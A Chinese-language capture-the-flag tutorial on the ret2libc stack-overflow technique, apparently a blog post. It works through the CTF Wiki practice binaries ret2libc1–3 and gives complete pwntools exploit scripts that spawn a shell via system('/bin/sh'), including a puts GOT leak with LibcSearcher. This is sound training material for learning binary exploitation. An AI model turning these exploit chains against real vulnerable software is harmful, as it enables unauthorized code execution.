# CTFWIKI-PWN-ret2libc

**目录**

[TOC]











## 1.libc

我们要先明白这种类型是什么 为什么我们可以使用这个

libc 是c语言在电脑中的库   是一个标准库

运用这个库 程序员可以很轻松的解决低级问题

比如获取系统时间、打开和关闭文件、分配和释放内存、格式化和输出字符串等等

## 2.plt 和got

这里我给出简易版的plt got 的调用



<img src="https://i-blog.csdnimg.cn/blog_migrate/052d17c12d8691c13c4d6f604974e262.png" alt="" style="max-height:522px; box-sizing:content-box;" />


以print函数为例

## 

就是通过两个表进行查找print函数的真实地址 其实里面还有一个函数是计算处真实地址

简略版流程图

## 3.调用system

调用完system.plt 需要加入返回地址 随便填写即可 因为我们打开命令就不需要返回

## 4.flat函数

```scss
flat([1,2,3,4])
```

会自动添加合适的发送方式 就是不用自己在写入p32 p64

## 5.libc泄露

如果我们无法找到system的plt地址 那我们就无法调用system函数

那我们该怎么找到他呢

假如代码前面执行了puts函数 那我们可以通过puts函数 进行计算 得到libc的版本 然后再通过

puts函数的真实地址 和 通过LibcSearcher工具得到的偏移量 就可以计算出每个函数的基地址

然后通过基地址我们就可以用system的偏移量得到system函数

## 例题1

以wiki里面的ret2libc1为例

### checksec



<img src="https://i-blog.csdnimg.cn/blog_migrate/14e86fd9e9ee80bd0d96b045c8636973.png" alt="" style="max-height:189px; box-sizing:content-box;" />


### ida



<img src="https://i-blog.csdnimg.cn/blog_migrate/a11af5a0e925ecad6e998ec1cb5fb1da.png" alt="" style="max-height:179px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/cd4731a7225b1e5ba962806e4efa661f.png" alt="" style="max-height:399px; box-sizing:content-box;" />


存在栈溢出 不存在shellcode





### 计算偏移量

```cobol
命令框1
gdb    ret2libc1 
 
r
输入
 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 
返回
*EIP  0x62616164 ('daab')
───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────
Invalid address 0x62616164
 
 
命令框2
 
cyclic  200
 
cyclic -l daab
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0afe35d6bbcc41106ecc1a8b8fcbfd0c.png" alt="" style="max-height:55px; box-sizing:content-box;" />


### 查找system.plt

直接看



<img src="https://i-blog.csdnimg.cn/blog_migrate/62fde00069b1dd472c2a0ac6ee56788d.png" alt="" style="max-height:65px; box-sizing:content-box;" />


### 查找/bin/sh

#### 1.ida



<img src="https://i-blog.csdnimg.cn/blog_migrate/5cdc1e8f5c1e87f521e759e92d9ec385.png" alt="" style="max-height:104px; box-sizing:content-box;" />




#### 2.ROPgadget

```cobol
ROPgadget --binary ret2libc1  --string '/bin/sh'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2af76f4d9291b9921a634944e0c3437d.png" alt="" style="max-height:144px; box-sizing:content-box;" />


得到地址

我们可以开始编写exp

### exp

```cobol
from pwn import *
p=process('./ret2libc1')
sys_add=0x08048460
bin_add=0x08048720
payload=flat(['A'*112,sys_add,1234,bin_add])
p.sendline(payload)
p.interactive()
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7bfd193e7497a8a8942ea7312a3b6a72.png" alt="" style="max-height:228px; box-sizing:content-box;" />


## 例题2

wiki里的ret2libc2

### checksec



<img src="https://i-blog.csdnimg.cn/blog_migrate/4996a2d66eabb908a542114d23f99286.png" alt="" style="max-height:209px; box-sizing:content-box;" />


### ida



<img src="https://i-blog.csdnimg.cn/blog_migrate/a04538d8ea0598ed21f1b184b81288f7.png" alt="" style="max-height:384px; box-sizing:content-box;" />


没有/bin/sh字符串了



<img src="https://i-blog.csdnimg.cn/blog_migrate/b62d2108006c1ce5569a25f39d729ef0.png" alt="" style="max-height:222px; box-sizing:content-box;" />


存在栈溢出

### 思路

这里又是应一个思路 我们没有可以使用的字符串 我们该怎么办 我们能不能实现自己输入

这里就可以调用get函数来让我们输入/bin/sh 然后在让system返回到我们输入的地方

### 给出流程图



<img src="https://i-blog.csdnimg.cn/blog_migrate/43ff7cecbf4596d1eb1e97d85275f3f5.png" alt="" style="max-height:530px; box-sizing:content-box;" />






### 查看bss是否可以写入

```less
gdb   ret2libc2
b main
r
vmmap
```

先看看ida中bss段在哪里



<img src="https://i-blog.csdnimg.cn/blog_migrate/926a4db1dc1fb7f16f65580ef6600da6.png" alt="" style="max-height:317px; box-sizing:content-box;" />




找到了 而且有一个变量可以存入

再看看gdb的



<img src="https://i-blog.csdnimg.cn/blog_migrate/071c7f05dd1ce1f055e35762a65122da.png" alt="" style="max-height:88px; box-sizing:content-box;" />


第三个就是bss段的地址区 发现可以写入的

开始编写exp

### exp

```cobol
from pwn import *
p=process('./ret2libc2')
get_add=0x08048460
sys_add=0x08048490
buf2_add=0x0804A080
payload=flat([b'A'*112,get_add,sys_add,buf2_add,buf2_add])
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ca611fc1a65d586ae834a0ff94b3f2bd.png" alt="" style="max-height:552px; box-sizing:content-box;" />


这里再次给出wiki的payload的解读流程图

```cobol
##!/usr/bin/env python
from pwn import *
 
sh = process('./ret2libc2')
 
gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(
    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/9a5e709c1fb701bcb45f89ea9439233d.png" alt="" style="max-height:712px; box-sizing:content-box;" />


再给出函数的执行流程 防止混乱



<img src="https://i-blog.csdnimg.cn/blog_migrate/99ef67bd9c95dbb7df428c4e7982fce1.png" alt="" style="max-height:588px; box-sizing:content-box;" />


## 例题3

需要使用LibcSeacher 里面的库可能不全 更新一下因为 我老是报错

 [解决LibcSearcher找不到合适libc（更新libc）_yongbaoii的博客-CSDN博客](https://blog.csdn.net/yongbaoii/article/details/113764938?ops_request_misc=&request_id=&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~all~koosearch~default-2-113764938-null-null.142%5Ev85%5Ekoosearch_v1,239%5Ev2%5Einsert_chatgpt&utm_term=libsearcher%20libc%E5%BA%93&spm=1018.2226.3001.4187) 

### checksec



<img src="https://i-blog.csdnimg.cn/blog_migrate/15de862fb5e277972d662cc23b674f4b.png" alt="" style="max-height:264px; box-sizing:content-box;" />


### ida



<img src="https://i-blog.csdnimg.cn/blog_migrate/b9aaeeb92e5359272bfd74f1f2631398.png" alt="" style="max-height:335px; box-sizing:content-box;" />


不存在/bin/sh

```cobol
from pwn import *
p=process('./ret2libc3')
elf=ELF('ret2libc3')
put_plt=elf.plt['puts']
put_got=elf.got['puts']
start_addr=elf.symbols['_start']
```

不存在system.plt

什么都没有所以我们没有办法用上面的办法

那我们该怎么办呢

我们需要找到libc泄露

我们看看我们在输入前执行了什么函数



<img src="https://i-blog.csdnimg.cn/blog_migrate/1ceb9068c98f2ded9b7c9ab8784d7329.png" alt="" style="max-height:112px; box-sizing:content-box;" />


发现有puts函数

因为puts函数执行了所以他的libc就能确定 不会变

不是地址不会变 是函数和puts真实地址的之间的链接是不会变的

所以我们只要使用puts函数的真实地址 求出他们之间的链接

我们就可以找到其他函数 因为这个链接是通用的

我们现在的目标就是寻找puts的got表 来找到真实地址

### 偏移量

和前面的一样 都是通过cyclic指令实现(不会就是没有认真看)

### 找puts的got

我们可以使用pwntools的ELF来寻找puts函数的got

```cobol
from pwn import *
p=process('./ret2libc3')
elf=ELF('ret2libc3')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start_addr=elf.symbols['_start']
```

这里有一个问题 为什么我们需要找到开始的地址 _start表示程序开始的地址

我们找这个的目的是为了让程序重新执行一遍 因为我们要上传shellcode

一遍我们只能找到got表的泄露 我们要写入的话就要重新执行一下 所以等等通过把start的地址存入返回地址 让程序执行两次

我们可以开始写找到got后的exp了（还没有写完 这是第一次的payload）

```cobol
from pwn import *
p=process('./ret2libc3')
elf=ELF('ret2libc3')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start_addr=elf.symbols['_start']
payload1=flat([b'A'*112,puts_plt,start_addr,puts_got])
p.sendlineafter('!?',payload1)
puts_addr=u32(p.recv(4))
```

这样我们得到了puts的真实地址

这里我们解释一下两个代码

```cobol
p.sendlineafter('!?',payload1)
在出现字符串!?后 注入payload1
puts_addr=u32(p.recv(4))
p.recv(4)接受程序返回的二进制 大小为4字节
u32（）为保存为无符号的32位
```

这里我们就得到了puts_addr的真实地址

### 使用libcsearcher 来查找libc偏移量

如果下面代码报错了 需要重新载入一下库 因为初始库可能无法使用

更新时间会很长

```cobol
libc=LibcSearcher('puts',puts_addr)
base=puts_addr-libc.dump('puts')
system_addr=base+libc.dump('system')
bin_addr=base+libc.dump('str_bin_sh')
payload2=flat([b'A'*112,system_addr,1234,bin_addr])
```

这就是libcsearch的函数 我们来解释一下

```cobol
libc=LibcSearcher('puts',puts_addr)、
计算出是多少版本的libc
base=puts_addr-libc.dump('puts')
通过计算出来的版本求得puts函数的基值 然后通过真实地址-基值=偏移量
system_addr=base+libc.dump('system')
通过偏移量+这个版本的system基值=真实system函数的地址
bin_addr=base+libc.dump('str_bin_sh')
通过偏移量+这个版本中字符串/bin/sh的基值 = 真实/bin/sh的地址
注意这里(str_bin_sh)是求字符串的写法
 
记住前面要引入LibcSearch库
```

### 完整exp

```cobol
from pwn import *
from LibcSearcher import *
 
p=process('./ret2libc3')
elf=ELF('ret2libc3')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start_addr=elf.symbols['_start']
payload1=flat([b'A'*112,puts_plt,start_addr,puts_got])
p.sendlineafter('!?',payload1)
puts_addr=u32(p.recv(4))
libc=LibcSearcher('puts',puts_addr)
base=puts_addr-libc.dump('puts')
system_addr=base+libc.dump('system')
bin_addr=base+libc.dump('str_bin_sh')
payload2=flat([b'A'*112,system_addr,1234,bin_addr])
p.sendlineafter('!?',payload2)
p.interactive()
 
 
```

### 

### 出现报错不用慌张



<img src="https://i-blog.csdnimg.cn/blog_migrate/259428c32ec837ab9de8b347f13253a6.png" alt="" style="max-height:337px; box-sizing:content-box;" />


有这么多选择 一个一个选过去



<img src="https://i-blog.csdnimg.cn/blog_migrate/9fd6bdde6c8da5c091052a00f4f35121.png" alt="" style="max-height:393px; box-sizing:content-box;" />


我就是选到第八个才可以 老倒霉了



### 附上流程图



<img src="https://i-blog.csdnimg.cn/blog_migrate/3a4072102ef993f14a823306c02e7249.png" alt="" style="max-height:568px; box-sizing:content-box;" />